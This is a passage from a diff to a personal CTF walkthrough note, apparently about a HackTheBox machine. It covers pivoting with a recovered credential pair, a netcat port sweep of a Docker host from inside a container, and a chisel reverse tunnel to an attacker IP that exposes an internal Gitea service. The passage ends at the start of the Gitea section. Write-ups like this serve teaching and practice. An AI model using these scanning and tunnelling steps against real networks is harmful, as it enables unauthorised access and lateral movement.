@@ -270,4 +270,83 @@ git show a76f8f75f7a4a12b706b0cf9c983796fa1985820
 >[!example]- Result
 >![[Pasted image 20250227115233.png]]
 
-- We found a user `dev01:Soulless_Developer#2022"`, can we use this credentials to get 
+## Pivoting
+- We found a user `dev01:Soulless_Developer#2022"`, can we use this credentials to get access via ssh, but we cant...
+```bash
+ssh dev01@10.10.11.164
+```
+>[!example]- Result
+>![[Pasted image 20250227120525.png]]
+
+- but we can connect through the container, the only thing that we need is the address of this interface (usualy end with `1`)
+```bash
+ip a
+ping -c 1 172.17.0.1
+```
+>[!example]- Result
+>![[Pasted image 20250227120742.png]]
+
+- we need to perform a port enumeration but we cant use this method `echo "" > /dev/tcp/172.17.0.1/22`, because this path dont exit
+>[!example]- Result
+>![[Pasted image 20250227121301.png]]
+
+- we can use [[nc]] instead of the previous method 
+```bash
+for port in $(seq 1 10000); do nc 172.17.0.1 $port -zv; done
+```
+>[!example]- Result
+>![[Pasted image 20250227121750.png]]
+
+- The port 3000 looks interesting because on the previus nmap enumeration, was flagged as filtered, lets check what is it
+```bash
+wget http://172.17.0.1:3000/ -q
+```
+>[!example]- Result
+>![[Pasted image 20250227122413.png]]
+
+- So there are a gitea repo, we can use [[chisel]] to perform a remote port forwarding to get access
+```bash
+wget https://github.com/jpillora/chisel/releases/download/v1.10.1/chisel_1.10.1_linux_amd64.gz
+gunzip chisel_1.10.1_linux_amd64.gz 
+mv chisel_1.10.1_linux_amd64 chisel
+chmod +x chisel
+```
+
+- optionally we can reduce the file size
+```bash
+su -hc chisel 
+upx chisel
+```
+
+- Transfer the executable (i had to use port 8000, because port 80 dosent works)
+>[!example]- Result
+>![[Pasted image 20250227124155.png]]
+```bash
+chmod +x chisel
+```
+
+- using [[chisel]]
+	- Attacker:
+```bash
+./chisel server --reverse -p 1234
+```
+>[!example]- Result
+>![[Pasted image 20250227124657.png]]
+	
+	- Client
+```bash
+./chisel client 10.10.16.5:1234 R:3000:172.17.0.1:3000
+```
+>[!example]- Result
+>![[Pasted image 20250227124908.png]]
+
+- now the tunnel is setted 
+```bash
+lsof -i:3000
+```
+>[!example]- Result
+>![[Pasted image 20250227124958.png]]
+
+### GITEA Enumeration
+- We can use the found creds to log in on this service, and looks like he have a private repo
+>[!exa]
